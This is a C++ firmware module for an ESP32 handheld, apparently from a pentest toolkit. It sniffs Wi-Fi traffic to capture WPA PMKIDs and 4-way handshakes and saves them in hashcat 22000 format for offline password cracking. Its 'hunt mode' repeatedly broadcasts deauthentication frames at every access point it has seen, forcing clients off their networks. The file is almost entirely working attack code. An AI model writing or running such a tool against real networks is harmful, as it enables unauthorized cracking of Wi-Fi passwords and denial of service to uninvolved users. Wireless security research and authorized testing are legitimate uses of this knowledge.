/*
 * wifi_pmkid — EAPOL capture → hashcat 22000 format.
 *
 * Captures both:
 *   WPA*01*  PMKID (from M1 of the 4-way) — passive, no client needed
 *   WPA*02*  Full 4-way handshake (M1 ANonce + M2 SNonce + MIC) —
 *            requires an actual client associating (trigger with deauth)
 *
 * Strategy:
 *   - Cache SSIDs from beacons/probe-responses by BSSID.
 *   - On every EAPOL-Key frame:
 *       * Check if it has a PMKID KDE — if yes, emit WPA*01*.
 *       * If it's M1 (from AP, Install=0, ACK=1): remember ANonce per
 *         (BSSID, STA) pair.
 *       * If it's M2 (from STA, Install=0, ACK=0, MIC=1): pair with the
 *         stored ANonce and emit WPA*02* with the captured EAPOL frame.
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>

static volatile uint32_t s_pmkids = 0;
static volatile uint32_t s_handshakes = 0;
static volatile uint32_t s_eapol_seen = 0;
static volatile uint8_t  s_current_ch = 1;
static volatile bool     s_running = false;
static File              s_out;

/* ---- notification state ---- */
enum notify_kind_t { NTF_NONE, NTF_PMKID, NTF_HS };
static volatile notify_kind_t s_notify = NTF_NONE;
static volatile uint32_t      s_notify_start = 0;
static char                   s_notify_ssid[33] = {0};
#define NOTIFY_DURATION_MS 2500

/* BSSID → SSID cache. */
struct bssid_ssid_t { uint8_t bssid[6]; char ssid[33]; };
#define BS_CACHE 32
static bssid_ssid_t s_cache[BS_CACHE];
static int          s_cache_n = 0;

/* Pending M1 ANonce per (BSSID, STA). */
#define M1_CACHE 16
struct m1_entry_t {
    uint8_t  bssid[6];
    uint8_t  sta[6];
    uint8_t  anonce[32];
    uint8_t  m1_eapol[256];
    int      m1_len;
    uint32_t ts;
};
static m1_entry_t s_m1[M1_CACHE];
static int        s_m1_n = 0;

static const char *ssid_for(const uint8_t *bssid)
{
    for (int i = 0; i < s_cache_n; ++i)
        if (memcmp(s_cache[i].bssid, bssid, 6) == 0) return s_cache[i].ssid;
    return "";
}

static void cache_beacon(const uint8_t *bssid, const uint8_t *tags, int len)
{
    if (len < 2 || tags[0] != 0 || tags[1] == 0 || tags[1] > 32) return;
    int idx = -1;
    for (int i = 0; i < s_cache_n; ++i)
        if (memcmp(s_cache[i].bssid, bssid, 6) == 0) { idx = i; break; }
    if (idx < 0) {
        if (s_cache_n >= BS_CACHE) return;
        idx = s_cache_n++;
        memcpy(s_cache[idx].bssid, bssid, 6);
    }
    memcpy(s_cache[idx].ssid, tags + 2, tags[1]);
    s_cache[idx].ssid[tags[1]] = '\0';
}

static void hex_append(char *buf, const uint8_t *data, int n)
{
    int off = strlen(buf);
    for (int i = 0; i < n; ++i) off += sprintf(buf + off, "%02x", data[i]);
}

/* Find or insert the M1 slot for this (bssid, sta) pair. */
static m1_entry_t *m1_slot(const uint8_t *bssid, const uint8_t *sta)
{
    for (int i = 0; i < s_m1_n; ++i) {
        if (memcmp(s_m1[i].bssid, bssid, 6) == 0 &&
            memcmp(s_m1[i].sta,   sta,   6) == 0) return &s_m1[i];
    }
    if (s_m1_n >= M1_CACHE) {
        /* Evict oldest. */
        int oldest = 0;
        for (int i = 1; i < s_m1_n; ++i)
            if (s_m1[i].ts < s_m1[oldest].ts) oldest = i;
        return &s_m1[oldest];
    }
    m1_entry_t *e = &s_m1[s_m1_n++];
    memcpy(e->bssid, bssid, 6);
    memcpy(e->sta,   sta,   6);
    return e;
}

/* Emit WPA*01* (PMKID) */
static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t *sta)
{
    if (!s_out) return;
    const char *ssid = ssid_for(bssid);
    char line[300] = "WPA*01*";
    hex_append(line, pmkid, 16);
    strcat(line, "*");
    hex_append(line, bssid, 6);
    strcat(line, "*");
    hex_append(line, sta, 6);
    strcat(line, "*");
    for (size_t i = 0; i < strlen(ssid); ++i) {
        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
        strcat(line, h);
    }
    strcat(line, "***\n");
    s_out.print(line);
    s_out.flush();
    s_pmkids++;

    /* Raise notification — UI task polls this. */
    strncpy(s_notify_ssid, ssid, sizeof(s_notify_ssid) - 1);
    s_notify_ssid[sizeof(s_notify_ssid) - 1] = '\0';
    if (!s_notify_ssid[0]) strcpy(s_notify_ssid, "(hidden)");
    s_notify = NTF_PMKID;
    s_notify_start = millis();
}

/* Emit WPA*02* (full 4-way handshake). Requires M1 ANonce and M2 EAPOL blob. */
static void emit_handshake(const uint8_t *bssid, const uint8_t *sta,
                           const uint8_t *mic, const uint8_t *anonce,
                           const uint8_t *m2_eapol, int m2_len)
{
    if (!s_out) return;
    const char *ssid = ssid_for(bssid);
    /* hashcat 22000 format:
       WPA*02*MIC*MAC_AP*MAC_STA*ESSID_HEX*ANONCE*EAPOL_FRAME_HEX*MSG_PAIR */
    char line[1024] = "WPA*02*";
    hex_append(line, mic, 16);
    strcat(line, "*");
    hex_append(line, bssid, 6);
    strcat(line, "*");
    hex_append(line, sta, 6);
    strcat(line, "*");
    for (size_t i = 0; i < strlen(ssid); ++i) {
        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
        strcat(line, h);
    }
    strcat(line, "*");
    hex_append(line, anonce, 32);
    strcat(line, "*");
    hex_append(line, m2_eapol, m2_len);
    strcat(line, "*02\n");  /* message_pair=02: M1+M2, challenge. */
    s_out.print(line);
    s_out.flush();
    s_handshakes++;

    /* Full 4-way handshake — most impressive, louder notification. */
    strncpy(s_notify_ssid, ssid, sizeof(s_notify_ssid) - 1);
    s_notify_ssid[sizeof(s_notify_ssid) - 1] = '\0';
    if (!s_notify_ssid[0]) strcpy(s_notify_ssid, "(hidden)");
    s_notify = NTF_HS;
    s_notify_start = millis();
}

/* Parse an EAPOL-Key frame. Returns everything we need to know about it. */
struct eapol_key_info_t {
    bool     is_key;
    uint16_t key_info;        /* big-endian info field */
    const uint8_t *key_nonce; /* 32 bytes */
    const uint8_t *key_mic;   /* 16 bytes */
    uint16_t kd_len;
    const uint8_t *kd_data;
    const uint8_t *eapol_raw; /* full EAPOL blob (for 22000 format) */
    int      eapol_len;
};

static bool parse_eapol(const uint8_t *frame, int len,
                        const uint8_t **out_bssid, const uint8_t **out_sta,
                        bool *from_ap,
                        eapol_key_info_t *ki)
{
    if (len < 40) return false;
    uint8_t fc  = frame[0];
    uint8_t subtype = (fc >> 4) & 0xF;
    uint8_t type    = (fc >> 2) & 0x3;
    if (type != 2) return false;
    uint8_t from_ds = (frame[1] >> 1) & 1;
    uint8_t to_ds   = (frame[1])     & 1;

    int hdr_len = 24;
    if (subtype & 0x8) hdr_len += 2;

    /* Determine source/destination. */
    const uint8_t *addr1 = &frame[4];   /* dst */
    const uint8_t *addr2 = &frame[10];  /* src / sender */
    const uint8_t *addr3 = &frame[16];  /* bssid (typically) */
    (void)addr3;

    /* LLC+SNAP check. */
    if (len < hdr_len + 8) return false;
    const uint8_t *llc = frame + hdr_len;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) return false;

    const uint8_t *eapol = llc + 8;
    int eapol_len = len - (int)(eapol - frame);
    if (eapol_len < 95) return false;
    if (eapol[1] != 0x03) return false;  /* not EAPOL-Key */

    if (from_ds && !to_ds) {
        /* AP → STA: addr1 = STA, addr2 = BSSID. */
        *out_sta   = addr1;
        *out_bssid = addr2;
        *from_ap   = true;
    } else if (to_ds && !from_ds) {
        /* STA → AP: addr1 = BSSID, addr2 = STA. */
        *out_bssid = addr1;
        *out_sta   = addr2;
        *from_ap   = false;
    } else {
        return false;
    }

    ki->is_key    = true;
    ki->key_info  = ((uint16_t)eapol[5] << 8) | eapol[6];
    ki->key_nonce = eapol + 17;
    ki->key_mic   = eapol + 81;
    ki->kd_len    = ((uint16_t)eapol[93] << 8) | eapol[94];
    ki->kd_data   = eapol + 95;
    ki->eapol_raw = eapol;
    ki->eapol_len = eapol_len;
    return true;
}

static void handle_eapol(const uint8_t *frame, int len)
{
    const uint8_t *bssid, *sta;
    bool from_ap;
    eapol_key_info_t ki = {};
    if (!parse_eapol(frame, len, &bssid, &sta, &from_ap, &ki)) return;
    s_eapol_seen++;

    /* PMKID lives in the key data TLVs. Always check. */
    if (ki.kd_len >= 22) {
        int off = 0;
        while (off + 2 < ki.kd_len) {
            uint8_t tlv_type = ki.kd_data[off];
            uint8_t tlv_len  = ki.kd_data[off + 1];
            if (off + 2 + tlv_len > ki.kd_len) break;
            if (tlv_type == 0xDD && tlv_len >= 20 &&
                ki.kd_data[off + 2] == 0x00 &&
                ki.kd_data[off + 3] == 0x0F &&
                ki.kd_data[off + 4] == 0xAC &&
                ki.kd_data[off + 5] == 0x04) {
                emit_pmkid(ki.kd_data + off + 6, bssid, sta);
                break;
            }
            off += 2 + tlv_len;
        }
    }

    /* 4-way handshake detection.
       Key info bits:  8=MIC present, 6=ACK, 4=install, 3=PairwiseKey */
    bool mic_set     = (ki.key_info & (1 << 8)) != 0;
    bool ack_set     = (ki.key_info & (1 << 7)) != 0;
    bool install_set = (ki.key_info & (1 << 6)) != 0;

    /* M1: from AP, ACK=1, MIC=0, Install=0. */
    if (from_ap && ack_set && !mic_set && !install_set) {
        m1_entry_t *e = m1_slot(bssid, sta);
        if (e) {
            memcpy(e->bssid, bssid, 6);
            memcpy(e->sta,   sta,   6);
            memcpy(e->anonce, ki.key_nonce, 32);
            int copy_len = ki.eapol_len < (int)sizeof(e->m1_eapol) ? ki.eapol_len : (int)sizeof(e->m1_eapol);
            memcpy(e->m1_eapol, ki.eapol_raw, copy_len);
            e->m1_len = copy_len;
            e->ts = millis();
        }
        return;
    }

    /* M2: from STA, MIC=1, ACK=0, Install=0. Pair with stored M1. */
    if (!from_ap && mic_set && !ack_set && !install_set) {
        m1_entry_t *e = m1_slot(bssid, sta);
        if (e && e->m1_len > 0) {
            /* Use M2's EAPOL frame body for the 22000 "eapol" field
             * (hashcat prefers M2 for decoded MIC). */
            emit_handshake(bssid, sta, ki.key_mic, e->anonce,
                           ki.eapol_raw, ki.eapol_len);
        }
    }
}

static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    if (type == WIFI_PKT_MGMT) {
        uint8_t st = (pkt->payload[0] >> 4) & 0xF;
        if (st == 0x8 || st == 0x5)
            cache_beacon(pkt->payload + 16, pkt->payload + 36, len - 36 - 4);
    } else if (type == WIFI_PKT_DATA) {
        handle_eapol(pkt->payload, len);
    }
}

static void hop_task(void *)
{
    while (s_running) {
        s_current_ch = (s_current_ch % 13) + 1;
        esp_wifi_set_channel(s_current_ch, WIFI_SECOND_CHAN_NONE);
        delay(500);
    }
    vTaskDelete(nullptr);
}

/* Hunt mode: periodically broadcast-deauth every cached BSSID to
 * force clients to re-handshake. Runs in parallel with promisc capture. */
static volatile bool s_hunt = false;
static uint8_t s_hunt_frame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0x00, 0x00,
    0x07, 0x00,
};

static void hunt_task(void *)
{
    while (s_running) {
        if (s_hunt && s_cache_n > 0) {
            for (int i = 0; i < s_cache_n && s_running && s_hunt; ++i) {
                memcpy(s_hunt_frame + 10, s_cache[i].bssid, 6);
                memcpy(s_hunt_frame + 16, s_cache[i].bssid, 6);
                /* Fire a burst of 3 frames on the current channel. */
                for (int j = 0; j < 3; ++j) {
                    esp_wifi_80211_tx(WIFI_IF_STA, s_hunt_frame,
                                      sizeof(s_hunt_frame), false);
                    delay(10);
                }
            }
        }
        delay(2000);
    }
    vTaskDelete(nullptr);
}

static void draw_notification(void)
{
    if (s_notify == NTF_NONE) return;
    /* First fire — full-screen dramatic overlay. */
    if (s_notify_start != 0 && millis() - s_notify_start < 100) {
        bool big = (s_notify == NTF_HS);
        char sub[48];
        snprintf(sub, sizeof(sub), "%.32s", s_notify_ssid);
        if (big) {
            M5Cardputer.Speaker.tone(1200, 120);
            ui_action_overlay("HANDSHAKE!", sub, ACT_BG_WAVES, 0xF81F, 1600);
            M5Cardputer.Speaker.tone(2400, 200);
        } else {
            M5Cardputer.Speaker.tone(1800, 100);
            ui_action_overlay("PMKID", sub, ACT_BG_RADAR, 0x07FF, 1000);
        }
        s_notify = NTF_NONE;  /* overlay consumed it */
        return;
    }
    uint32_t age = millis() - s_notify_start;
    if (age > NOTIFY_DURATION_MS) { s_notify = NTF_NONE; return; }

    auto &d = M5Cardputer.Display;
    bool big = (s_notify == NTF_HS);

    /* Blink cycle: flash every 200ms for first half, solid for second. */
    bool flash = (age < 1000) && ((age / 150) & 1);
    uint16_t bg = big ? (flash ? COL_BAD : 0x4000) : (flash ? COL_GOOD : 0x0320);
    uint16_t fg = big ? COL_WARN : COL_BG;

    int bw = SCR_W - 16;
    int bh = 44;
    int bx = 8;
    int by = (SCR_H - bh) / 2;

    d.fillRoundRect(bx, by, bw, bh, 4, bg);
    d.drawRoundRect(bx, by, bw, bh, 4, fg);
    d.drawRoundRect(bx + 1, by + 1, bw - 2, bh - 2, 3, fg);

    d.setTextColor(fg, bg);
    d.setTextSize(2);
    const char *hdr = big ? "HANDSHAKE!" : "PMKID!";
    int tw = d.textWidth(hdr) * 2;
    d.setCursor(bx + (bw - tw) / 2, by + 4);
    d.print(hdr);

    d.setTextSize(1);
    d.setCursor(bx + 6, by + 26);
    d.printf("%.30s", s_notify_ssid);

    /* Side stripe indicator. */
    for (int y = by + 3; y < by + bh - 3; y += 3) {
        d.drawPixel(bx + 3, y, fg);
        d.drawPixel(bx + bw - 4, y, fg);
    }

    /* Sound cue: only on the first frame of the notification. */
    static uint32_t s_last_tone_start = 0;
    if (s_notify_start != s_last_tone_start) {
        s_last_tone_start = s_notify_start;
        if (big) {
            /* Three-note rising fanfare. */
            M5Cardputer.Speaker.tone(1200, 120); delay(130);
            M5Cardputer.Speaker.tone(1800, 120); delay(130);
            M5Cardputer.Speaker.tone(2400, 240);
        } else {
            /* Short double-beep for PMKID. */
            M5Cardputer.Speaker.tone(1500, 80);  delay(90);
            M5Cardputer.Speaker.tone(2000, 120);
        }
    }
}

void feat_wifi_pmkid(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    if (!SD.begin()) { ui_toast("SD needed", COL_BAD, 1500); return; }
    SD.mkdir("/poseidon");
    s_out = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
    if (!s_out) { ui_toast("cant open file", COL_BAD, 1500); return; }

    s_pmkids = 0;
    s_handshakes = 0;
    s_eapol_seen = 0;
    s_cache_n = 0;
    s_m1_n = 0;
    s_current_ch = 1;
    s_running = true;
    s_hunt = false;
    s_notify = NTF_NONE;

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    esp_wifi_set_channel(s_current_ch, WIFI_SECOND_CHAN_NONE);

    xTaskCreate(hop_task,  "pmkid_hop",  3072, nullptr, 4, nullptr);
    xTaskCreate(hunt_task, "pmkid_hunt", 3072, nullptr, 3, nullptr);

    ui_clear_body();
    ui_draw_footer("H=hunt mode  `=stop");
    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_BAD, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.print("HANDSHAKE CAPTURE");
    d.drawFastHLine(4, BODY_Y + 12, 150, COL_BAD);

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 200) {
            last = millis();
            d.fillRect(0, BODY_Y + 18, SCR_W, 90, COL_BG);
            d.setTextColor(COL_FG, COL_BG);
            d.setCursor(4, BODY_Y + 18); d.printf("channel:    %u", s_current_ch);
            d.setCursor(4, BODY_Y + 28); d.printf("APs seen:   %d", s_cache_n);
            d.setCursor(4, BODY_Y + 38); d.printf("EAPOLs:     %lu", (unsigned long)s_eapol_seen);
            d.setTextColor(s_pmkids > 0 ? COL_GOOD : COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 48); d.printf("PMKIDs:     %lu", (unsigned long)s_pmkids);
            d.setTextColor(s_handshakes > 0 ? COL_GOOD : COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 58); d.printf("Handshakes: %lu", (unsigned long)s_handshakes);
            d.setTextColor(s_hunt ? COL_BAD : COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 70); d.printf("HUNT:       %s", s_hunt ? "ON - deauthing" : "off");
            d.setTextColor(COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 82); d.print("/poseidon/hashcat.22000");
            ui_draw_status(radio_name(), s_hunt ? "hunt" : "capture");
        }
        /* Radial wave pulse + matrix rain gutter. */
        ui_waves(200, BODY_Y + BODY_H / 2, 40, s_hunt ? COL_BAD : COL_GOOD);

        /* Notification overlay drawn on top of everything. */
        draw_notification();

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == 'h' || k == 'H') s_hunt = !s_hunt;
    }

    s_running = false;
    s_hunt = false;
    esp_wifi_set_promiscuous(false);
    if (s_out) { s_out.flush(); s_out.close(); }
    delay(200);
}
